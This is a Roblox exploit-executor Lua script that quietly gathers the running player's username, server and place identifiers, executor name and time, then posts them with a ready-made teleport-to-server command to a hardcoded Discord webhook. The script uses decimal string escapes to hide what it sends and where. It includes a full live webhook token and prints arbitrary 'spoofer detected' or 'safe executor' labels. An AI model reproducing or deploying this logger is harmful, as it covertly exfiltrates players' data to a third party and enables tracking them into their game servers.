local a = "https://discord.com/api/webhooks/1357629053871460392/g9a1xjPkH0H--b-UnNd5Yuz18MsTX2EOWJtk65yVF4wMKyOd_2Rp1gGHkC7USACgPGMB"

local b = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
task.wait(0.2)
local c = os.date("%Y-%m-%d %H:%M:%S", os.time())
local d = "Unknown Place"

local e, f = pcall(function()
    return game:GetService("\77\97\114\107\101\116\112\108\97\99\101\83\101\114\118\105\99\101"):GetProductInfo(game.PlaceId)
end)

if e and f and f.Name then d = f.Name end

local v0 = identifyexecutor()
local v1 = ""

if v0 == "JJSploit x Xeno" then
          v1 = "IP/HWID Spoofer Detected"
end

if v0 == "JJSploit" then
          v1 = "HWID Spoofer Detected"
end

if v0 == "Xeno" then
          v1 = "IP/HWID Spoofer Detected"
end

if v0 == "Krnl" or v0 == "KRNL" then
          v1 = "IP/HWID Spoofer Detected"
end

if v0 == "Krnl" then
          v1 = "Safe Executor"
end

if v0 == "Delta" then
          v1 = "Safe Mobile Executor"
end

if v0 == "Solara" then
          v1 = "Safe PC Executor"
end

if v0 == "" then
          v1 = "Safety Unknown"
end

local g = {
    content = "",
    embeds = {{
        title = "\86\101\114\115\105\111\110 2 Execution Details",
        color = 16711680,
        fields = {
            { name = "**\80\108\97\121\101\114 \78\97\109\101**", value = "`" .. game.Players.LocalPlayer.Name .. "`", inline = true },
            { name = "**\80\108\97\99\101 \73\68**", value = "`" .. game.PlaceId .. "`", inline = true },
            { name = "**\80\108\97\99\101 \78\97\109\101**", value = "`" .. d .. "`", inline = true },
            { name = "**\74\111\98 \73\68**", value = "`" .. (game.JobId or "\78\47\65") .. "`", inline = false },
            { name = "**\84\105\109\101 \69\120\101\99\117\116\101\100**", value = "`" .. c .. "`", inline = true },
            { name = "**\69\120\101\99\117\116\111\114**", value = (identifyexecutor() or "\85\110\107\110\111\119\110"), inline = true },
            { name = "**Executor Host Information**", value = v1, inline = true },
            { name = "**\81\117\105\99\107 \74\111\105\110**", value = "\96\96\96\108\117\97\10\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101(\"TeleportService\")\58\84\101\108\101\112\111\114\116\84\111\80\108\97\99\101\73\110\115\116\97\110\99\101('" .. game.PlaceId .. "', '" .. (game.JobId or "\78\47\65") .. "', game.Players.LocalPlayer)\10\96\96\96", inline = false }
        },
        footer = {
            text = "\69\120\101\99\117\116\105\111\110 \76\111\103 • " .. c,
            icon_url = "\104\116\116\112\115\58\47\47\109\101\100\105\97\46\100\105\115\99\111\114\100\97\112\112\46\110\101\116\47\97\116\116\97\99\104\109\101\110\116\115\47\49\51\53\52\49\50\48\54\50\54\56\55\50\53\50\48\56\48\52\47\49\51\53\52\49\50\55\57\53\57\48\57\56\55\57\48\48\55\49\47\78\101\119\95\80\114\111\106\101\99\116\95\50\49\46\112\110\103?ex=67e4296f&is=67e2d7ef&hm=4abb6001c6d31e46b50e3ba89487f1274bf68c49a39ee586655f34de507f889a&=&format=webp&quality=lossless"
        }
    }}
}

local h = game:GetService("\72\116\116\112\83\101\114\118\105\99\101")["JSON".."\69\110\99\111\100\101"](game:GetService("\72\116\116\112\83\101\114\118\105\99\101"), g)

if b then
    pcall(function()
        b({
            Url = a,
            Method = "\80\79\83\84",
            Headers = { ["\67\111\110\116\101\110\116\45\84\121\112\101"] = "\97\112\112\108\105\99\97\116\105\111\110\47\106\115\111\110" },
            Body = h
        })
    end)
end
